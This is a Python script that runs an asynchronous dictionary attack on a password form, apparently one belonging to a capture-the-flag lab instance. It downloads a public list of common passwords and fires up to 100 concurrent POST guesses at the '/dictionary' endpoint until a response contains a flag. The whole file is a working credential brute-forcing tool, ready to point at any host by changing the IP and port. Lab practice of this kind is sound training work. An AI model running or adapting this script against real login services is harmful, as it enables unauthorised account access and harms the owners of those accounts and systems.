import asyncio
import aiohttp

ip = "94.237.54.42"  # Replace with your instance IP address
port = 32157         # Replace with your instance port number
url = f"http://{ip}:{port}/dictionary"

# URL to the list of common passwords
password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt"

async def try_password(session, password):
    """
    Attempt a single password by sending a POST request.
    """
    data = {'password': password}
    async with session.post(url, data=data) as response:
        if response.status == 200:  # Check if the response is successful
            json_data = await response.json()
            if 'flag' in json_data:  # Check if the flag is in the response
                print(f"Correct password found: {password}")
                print(f"Flag: {json_data['flag']}")
                return True
    return False

async def main():
    # Fetch the password list
    async with aiohttp.ClientSession() as session:
        async with session.get(password_list_url) as response:
            if response.status != 200:
                print("Failed to download the password list.")
                return
            password_list = (await response.text()).splitlines()

        # Limit concurrency to 100 tasks at a time
        semaphore = asyncio.Semaphore(100)
        tasks = []

        async def task_wrapper(password):
            async with semaphore:
                success = await try_password(session, password)
                if success:
                    for task in tasks:
                        task.cancel()  # Cancel all remaining tasks
                    return True

        for password in password_list:
            tasks.append(asyncio.create_task(task_wrapper(password)))

        # Wait for all tasks to complete or be canceled
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass

# Run the script
asyncio.run(main())
